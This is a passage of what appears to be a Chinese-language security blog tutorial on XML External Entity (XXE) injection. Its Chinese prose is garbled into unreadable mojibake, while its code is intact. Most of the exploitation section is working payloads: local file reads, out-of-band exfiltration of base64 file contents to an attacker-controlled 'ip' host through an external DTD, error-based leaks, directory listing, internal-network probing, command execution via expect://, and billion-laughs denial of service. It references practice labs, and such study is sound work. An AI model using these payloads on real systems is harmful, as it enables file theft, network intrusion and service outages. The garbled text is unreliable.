å¯ä»¥åœ¨ XML æ–‡æ¡£å†…å£°æ˜ï¼Œä¹Ÿå¯ä»¥å¤–éƒ¨å¼•ç”¨ã€‚</p></blockquote><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY b &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢æ‰€ç¤ºçš„å°±æ˜¯ä¸€ä¸ªDTD</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">    &lt;!ENTITY b system &quot;å¤–éƒ¨dtdåœ°å€&quot;&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢æ‰€ç¤ºçš„å°±æ˜¯ä¸€ä¸ªå¤–éƒ¨DTD</p><h3 id="å®ä½“"><a href="#å®ä½“" class="headerlink" title="å®ä½“"></a>å®ä½“</h3><blockquote><p>DTDå®ä½“æ˜¯ç”¨äºå®šä¹‰å¼•ç”¨æ™®é€šæ–‡æœ¬æˆ–ç‰¹æ®Šå­—ç¬¦çš„å¿«æ·æ–¹å¼çš„å˜é‡ï¼Œå¯ä»¥å†…éƒ¨å£°æ˜æˆ–å¤–éƒ¨å¼•ç”¨ã€‚</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">&lt;!ENTITY hello &quot;hello world&quot; &gt; </span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;foo&gt;&amp;hello&lt;/foo&gt;</span><br></pre></td></tr></table></figure><p>æ–‡æ¡£å…ƒç´ å¯ä»¥ä½¿ç”¨&amp;æ¥å¼•ç”¨å®ä½“çš„å€¼ï¼Œ<code>&amp;hello</code>å°†è¢«æ›¿æ¢ä¸º<code>hello world</code></p><h4 id="å‚æ•°å®ä½“"><a href="#å‚æ•°å®ä½“" class="headerlink" title="å‚æ•°å®ä½“"></a>å‚æ•°å®ä½“</h4><p>XMLå‚æ•°å®ä½“æ˜¯ä¸€ç§ç‰¹æ®Šçš„XMLå®ä½“ï¼Œåªèƒ½åœ¨DTDä¸­çš„å…¶ä»–åœ°æ–¹å¼•ç”¨</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">&lt;!ENTITY % b &quot;&lt;!ENTITY b1 &quot;awsl&quot;&gt;&quot;&gt;</span><br><span class="line">    %b;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å‚æ•°å®ä½“ç”¨<code>% name</code>å£°æ˜ï¼Œå¼•ç”¨æ—¶ç”¨<code>%name;</code></p><h4 id="å¼•å…¥å¤–éƒ¨å®ä½“"><a href="#å¼•å…¥å¤–éƒ¨å®ä½“" class="headerlink" title="å¼•å…¥å¤–éƒ¨å®ä½“"></a>å¼•å…¥å¤–éƒ¨å®ä½“</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">&lt;!ENTITY ext SYSTEM &quot;file:///path/to/file&quot; &gt; </span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä½¿ç”¨äº†fileåè®®æ¥å¼•å…¥å¤–éƒ¨å®ä½“ï¼Œå®é™…ä¸Šè¿˜èƒ½æ”¯æŒå¦‚ä¸‹åè®®ï¼Œè¿™ä¹Ÿæ˜¯xxeæ¼æ´å½¢æˆçš„åŸå› </p><p><img src="/../images/1270588-20200115235522292-2141935835.png" alt="img"></p><p><img src="/../images/20181120002647-e965b74c-ec17-1.png" alt="20181120002647-e965b74c-ec17-1"></p><h1 id="XXEæ¼æ´"><a href="#XXEæ¼æ´" class="headerlink" title="XXEæ¼æ´"></a>XXEæ¼æ´</h1><h2 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p>XXE æ¼æ´å…¨ç§° XML External Entity Injectionï¼Œå³ xml å¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´</p><h2 id="æ¼æ´æˆå› "><a href="#æ¼æ´æˆå› " class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h2><p>XXE æ¼æ´å‘ ç”Ÿåœ¨<strong>åº”ç”¨ç¨‹åºè§£æ XML è¾“å…¥æ—¶</strong>ï¼Œæ²¡æœ‰ç¦æ­¢<strong>å¤–éƒ¨å®ä½“</strong>çš„åŠ è½½ï¼Œè€Œå¤–éƒ¨å®ä½“çš„å¼•ç”¨å¯æ”¯æŒhttpï¼Œfileç­‰åè®®ï¼Œé€šè¿‡åˆ©ç”¨è¿™äº›åè®®è¿›è¡Œæ”»å‡»ã€‚</p><p><img src="/../images/1270588-20200115235522292-2141935835.png" alt="img"></p><p><img src="/../images/20181120002647-e965b74c-ec17-1.png" alt="20181120002647-e965b74c-ec17-1"></p><h2 id="æ¼æ´æ£€æµ‹"><a href="#æ¼æ´æ£€æµ‹" class="headerlink" title="æ¼æ´æ£€æµ‹"></a>æ¼æ´æ£€æµ‹</h2><h3 id="é»‘ç›’"><a href="#é»‘ç›’" class="headerlink" title="é»‘ç›’"></a>é»‘ç›’</h3><ul><li><p>æ•°æ®åŒ…ä¸­çš„content-type</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">application/xml</span><br><span class="line">text/xml</span><br></pre></td></tr></table></figure></li><li><p>http body</p><p><img src="/../images/image-20230605180133052-1686034648311.png" alt="image-20230605180133052"></p></li><li><p>æ•°æ®åŒ…è¯·æ±‚å¤´ä¸­Context-Typeçš„å€¼ä¸ºapplication&#x2F;jsonï¼Œæ›´æ”¹ä¸ºapplication&#x2F;xmlæˆ–è€…text&#x2F;xmlï¼Œç„¶åæ’å…¥payloadæµ‹è¯•</p></li></ul><h3 id="ç™½ç›’"><a href="#ç™½ç›’" class="headerlink" title="ç™½ç›’"></a>ç™½ç›’</h3><h4 id="php"><a href="#php" class="headerlink" title="php"></a>php</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">simplexml_import_dom</span>()</span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯PHPæ˜¯ä½¿ç”¨libxmlæ¥è§£æXMLçš„ï¼Œä½†æ˜¯<strong>libxml2.9.0</strong>å¼€å§‹å°±é»˜è®¤ä¸è§£æå¤–éƒ¨å®ä½“ï¼Œè‡ªç„¶å°±ä¸å­˜åœ¨xxeæ¼æ´ã€‚</p><h4 id="java"><a href="#java" class="headerlink" title="java"></a>java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">javax.xml.parsers.DocumentBuilder</span><br><span class="line">javax.xml.parsers.SAXParser</span><br><span class="line">javax.xml.parsers.SAXParserFactory</span><br><span class="line">javax.xml.transform.TransformerFactory</span><br><span class="line">javax.xml.validation.Validator</span><br><span class="line">javax.xml.validation.SchemaFactory</span><br><span class="line">javax.xml.transform.sax.SAXTransformerFactory</span><br><span class="line">javax.xml.transform.sax.SAXSource</span><br><span class="line">org.xml.sax.XMLReader</span><br><span class="line">org.xml.sax.helpers.XMLReaderFactory</span><br><span class="line">org.dom4j.io.SAXReader</span><br><span class="line">org.jdom.input.SAXBuilder</span><br><span class="line">org.jdom2.input.SAXBuilder</span><br><span class="line">javax.xml.bind.Unmarshaller</span><br><span class="line">javax.xml.xpath.XpathExpression</span><br><span class="line">javax.xml.stream.XMLStreamReader</span><br><span class="line">org.apache.commons.digester3.Digester</span><br></pre></td></tr></table></figure><h2 id="æ¼æ´å±å®³"><a href="#æ¼æ´å±å®³" class="headerlink" title="æ¼æ´å±å®³"></a>æ¼æ´å±å®³</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ–‡ä»¶è¯»å–</span><br><span class="line">å†…ç½‘æ¢é’ˆ</span><br><span class="line">æ‹’ç»æœåŠ¡æ”»å‡»</span><br><span class="line">å‘½ä»¤æ‰§è¡Œ</span><br></pre></td></tr></table></figure><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><h3 id="å®éªŒç¯å¢ƒ"><a href="#å®éªŒç¯å¢ƒ" class="headerlink" title="å®éªŒç¯å¢ƒ"></a>å®éªŒç¯å¢ƒ</h3><ul><li><a href="https://github.com/c0ny1/xxe-lab">https://github.com/c0ny1/xxe-lab</a> phpç‰ˆæœ¬</li><li>vulhub Apache solr XML å®ä½“æ³¨å…¥æ¼æ´ï¼ˆCVE-2017-12629ï¼‰</li></ul><h3 id="æœ‰å›æ˜¾"><a href="#æœ‰å›æ˜¾" class="headerlink" title="æœ‰å›æ˜¾"></a>æœ‰å›æ˜¾</h3><p>Demo</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line"><span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line"><span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$creds</span>-&gt;username;</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$creds</span>-&gt;password;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$username</span> == <span class="variable">$USERNAME</span> &amp;&amp; <span class="variable">$password</span> == <span class="variable">$PASSWORD</span>)&#123;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">1</span>,<span class="variable">$username</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">0</span>,<span class="variable">$username</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">3</span>,<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>username</code>ä¸ºå›æ˜¾ä½</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE creds [  </span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; </span><br><span class="line">]&gt;                                                         </span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="æ— å›æ˜¾"><a href="#æ— å›æ˜¾" class="headerlink" title="æ— å›æ˜¾"></a>æ— å›æ˜¾</h3><h4 id="å¤–å¸¦"><a href="#å¤–å¸¦" class="headerlink" title="å¤–å¸¦"></a>å¤–å¸¦</h4><p>php:&#x2F;&#x2F;filterè¯»å–å¯¹æ–¹æœåŠ¡å™¨æ–‡ä»¶å†…å®¹â†’å¼•å…¥å¤–éƒ¨å®ä½“ï¼ˆæ”»å‡»æœåŠ¡å™¨ä¸Šçš„ï¼‰â†’è§¦å‘å¤–éƒ¨å®ä½“ä¸­çš„å†™å…¥ä»£ç ï¼Œå°†è¯»å–åˆ°çš„æ–‡ä»¶å†…å®¹èµ‹å€¼ç»™æŒ‡å®šå‚æ•°â†’æ¥æ”¶å‚æ•°ï¼Œåœ¨æ”»å‡»æœåŠ¡å™¨ç›‘å¬æˆ–è€…æŸ¥çœ‹æ—¥å¿—ï¼Œä»è€Œè·å–åˆ°å¯¹æ–¹æœåŠ¡å™¨æ–‡ä»¶å†…å®¹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///e:/test.txt&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % dtd SYSTEM &quot;http://ip:8000/test.dtd&quot;&gt;</span><br><span class="line">    %dtd;</span><br><span class="line">    %send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--test.dtd--&gt;</span><br><span class="line">&lt;!ENTITY % payload</span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://ip:8888/?data=%file;&#x27;&gt;&quot;</span><br><span class="line">&gt;</span><br><span class="line">%payload;</span><br></pre></td></tr></table></figure><blockquote><p>æ³¨æ„ï¼štest.dtdçš„å†…å®¹ï¼Œå†…éƒ¨çš„%å·è¦è¿›è¡Œå®ä½“ç¼–ç æˆ&amp;#x25ï¼ˆå› ä¸ºå®ä½“çš„å€¼ä¸­ä¸èƒ½æœ‰ %, æ‰€ä»¥å°†å…¶è½¬æˆhtmlå®ä½“ç¼–ç  <code>%</code>ï¼‰</p></blockquote><p><img src="/../images/image-20230605192212337.png" alt="image-20230605192212337"></p><h4 id="åŸºäºæŠ¥é”™"><a href="#åŸºäºæŠ¥é”™" class="headerlink" title="åŸºäºæŠ¥é”™"></a>åŸºäºæŠ¥é”™</h4><p>æ„é€ ä¸€ä¸ªé”™è¯¯çš„urlå¹¶å°†æ³„éœ²æ–‡ä»¶å†…å®¹æ”¾åœ¨urlä¸­ï¼Œé€šè¿‡è¿™æ ·çš„æ–¹å¼è¿”å›æ•°æ®ã€‚</p><h5 id="å¼•å…¥æœåŠ¡å™¨å®ä½“"><a href="#å¼•å…¥æœåŠ¡å™¨å®ä½“" class="headerlink" title="å¼•å…¥æœåŠ¡å™¨å®ä½“"></a>å¼•å…¥æœåŠ¡å™¨å®ä½“</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY % xxe SYSTEM &quot;http://ip:8000/xml.dtd&quot;&gt; </span><br><span class="line">    %xxe;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>xml.dtd</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--é€šè¿‡æ‰§è¡Œerrorå®ä½“ï¼Œä»¥ä¾¿é€šè¿‡å°è¯•åŠ è½½ä¸å­˜åœ¨çš„æ–‡ä»¶æ¥å¸¦å‡ºç›®æ ‡æ–‡ä»¶çš„å€¼ï¼Œä»è€Œç”ŸæˆåŒ…å«ä¸å­˜åœ¨æ–‡ä»¶çš„åç§°çš„é”™è¯¯æ¶ˆæ¯ï¼Œè¯¥æ–‡ä»¶æ˜¯/etc/passwdæ–‡ä»¶çš„å†…å®¹--&gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#x27;file:///nonexistent/%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%error;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230606142023880.png" alt="image-20230606142023880"></p><h5 id="å¼•å…¥æœ¬åœ°ç³»ç»Ÿæ–‡ä»¶â€“æµ‹è¯•å¤±è´¥"><a href="#å¼•å…¥æœ¬åœ°ç³»ç»Ÿæ–‡ä»¶â€“æµ‹è¯•å¤±è´¥" class="headerlink" title="å¼•å…¥æœ¬åœ°ç³»ç»Ÿæ–‡ä»¶â€“æµ‹è¯•å¤±è´¥"></a>å¼•å…¥æœ¬åœ°ç³»ç»Ÿæ–‡ä»¶â€“æµ‹è¯•å¤±è´¥</h5><p><a href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/">https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///C:/Windows/System32/wbem/xml/cim20.dtd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % SuperClass &#x27;</span><br><span class="line">         &gt;Your DTD code&lt;!ENTITY test &quot;test&quot;</span><br><span class="line">        &#x27;&gt;</span><br><span class="line">    %local_dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>DTD code</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;eval;</span><br><span class="line">        &amp;#x25;error;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///C:/Windows/System32/wbem/xml/cim20.dtd&quot;&gt;</span><br><span class="line">        &lt;!ENTITY % SuperClass &#x27;&gt;</span><br><span class="line">         &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;eval;</span><br><span class="line">        &amp;#x25;error; &lt;!ENTITY test &quot;test&quot;</span><br><span class="line">        &#x27;&gt;</span><br><span class="line">    %local_dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><h5 id="åµŒå¥—å‚æ•°å®ä½“"><a href="#åµŒå¥—å‚æ•°å®ä½“" class="headerlink" title="åµŒå¥—å‚æ•°å®ä½“"></a>åµŒå¥—å‚æ•°å®ä½“</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ELEMENT message ANY&gt;</span><br><span class="line">    &lt;!ENTITY % para1 SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % para &#x27;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;para2;</span><br><span class="line">    &#x27;&gt;</span><br><span class="line">    %para;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230605210541295.png" alt="image-20230605210541295"></p><p>ä¸æ˜¯æ‰€æœ‰çš„xmlè§£æå™¨éƒ½èƒ½è§£æåµŒå¥—å‚æ•°å®ä½“</p><p><img src="/../images/image-20230606151226408.png" alt="image-20230606151226408"></p><h3 id="åˆ©ç”¨æ–¹å¼"><a href="#åˆ©ç”¨æ–¹å¼" class="headerlink" title="åˆ©ç”¨æ–¹å¼"></a>åˆ©ç”¨æ–¹å¼</h3><h4 id="æ–‡ä»¶è¯»å–"><a href="#æ–‡ä»¶è¯»å–" class="headerlink" title="æ–‡ä»¶è¯»å–"></a>æ–‡ä»¶è¯»å–</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;        </span><br><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">&lt;!ENTITY rabbit SYSTEM &quot;file:///æ–‡ä»¶è·¯å¾„&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!-- ä½¿ç”¨phpçš„filterè¿‡æ»¤å™¨è¯»å–å«æœ‰xmlä¿ç•™å­—ç¬¦çš„æ–‡ä»¶ --&gt;</span><br><span class="line">&lt;!DOCTYPE roottag [</span><br><span class="line">&lt;!ENTITY  rabbit SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///e:/test.txt&quot;&gt;]&gt; </span><br><span class="line"></span><br><span class="line">&lt;firstname&gt;&amp;rabbit;&lt;/firstname&gt;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230605193428910.png" alt="image-20230605193428910"></p><p>å½“ä¸èƒ½ä½¿ç”¨è¿‡æ»¤å™¨æ—¶</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE roottag [</span><br><span class="line">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   </span><br><span class="line">&lt;!ENTITY % goodies SYSTEM &quot;file:///f:/test.txt&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt; </span><br><span class="line">%dtd; ]&gt; </span><br></pre></td></tr></table></figure><p>evil.dtd</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</span><br></pre></td></tr></table></figure><p>POSTæ•°æ®</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- &amp;allæ˜¯ä½¿ç”¨evil.dtdä¸­çš„å®ä½“--&gt;</span><br><span class="line">&lt;roottag&gt;&amp;all;&lt;/roottag&gt;  </span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230605204320348.png" alt="image-20230605204320348"></p><h4 id="åˆ—ç›®å½•â€“JAVA"><a href="#åˆ—ç›®å½•â€“JAVA" class="headerlink" title="åˆ—ç›®å½•â€“JAVA"></a>åˆ—ç›®å½•â€“JAVA</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- Root / --&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE aa[</span><br><span class="line">    &lt;!ELEMENT bb ANY&gt;</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;file:///&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&lt;/root&gt;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230607100242865.png" alt="image-20230607100242865"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- Root / --&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE aa[</span><br><span class="line">    &lt;!ELEMENT bb ANY&gt;</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;netdoc:///&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&lt;/root&gt;</span><br></pre></td></tr></table></figure><h4 id="å†…ç½‘æ¢æµ‹"><a href="#å†…ç½‘æ¢æµ‹" class="headerlink" title="å†…ç½‘æ¢æµ‹"></a>å†…ç½‘æ¢æµ‹</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;        </span><br><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY rabbit SYSTEM &quot;http://å†…ç½‘ip:port&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;firstname&gt;&amp;rabbit;&lt;/firstname&gt;</span><br></pre></td></tr></table></figure><h4 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h4><blockquote><p>è¯¥ CASE æ˜¯åœ¨å®‰è£… expect æ‰©å±•çš„ PHP ç¯å¢ƒé‡Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;expect://å‘½ä»¤&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br></pre></td></tr></table></figure><h4 id="DOSæ”»å‡»â€“æ²¡æˆåŠŸè¿‡"><a href="#DOSæ”»å‡»â€“æ²¡æˆåŠŸè¿‡" class="headerlink" title="DOSæ”»å‡»â€“æ²¡æˆåŠŸè¿‡"></a>DOSæ”»å‡»â€“æ²¡æˆåŠŸè¿‡</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE lolz [  &lt;!ENTITY lol &quot;lol&quot;&gt;  &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;  &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;  &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;  &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;  &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;  &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;  &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;  &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt; ]&gt; &lt;lolz&gt;&amp;lol9;&lt;/lolz&gt; </span><br></pre></td></tr></table></figure><p>æ­¤æµ‹è¯•å¯ä»¥åœ¨å†…å­˜ä¸­å°†å°å‹ XML æ–‡æ¡£æ‰©å±•åˆ°è¶…è¿‡ 3GB è€Œä½¿æœåŠ¡å™¨å´©æºƒã€‚<br>äº¦æˆ–è€…ï¼Œå¦‚æœç›®æ ‡æ˜¯UNIXç³»ç»Ÿï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">  &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">  &lt;!ENTITY xxe SYSTEM &quot;file:///dev/random&quot; 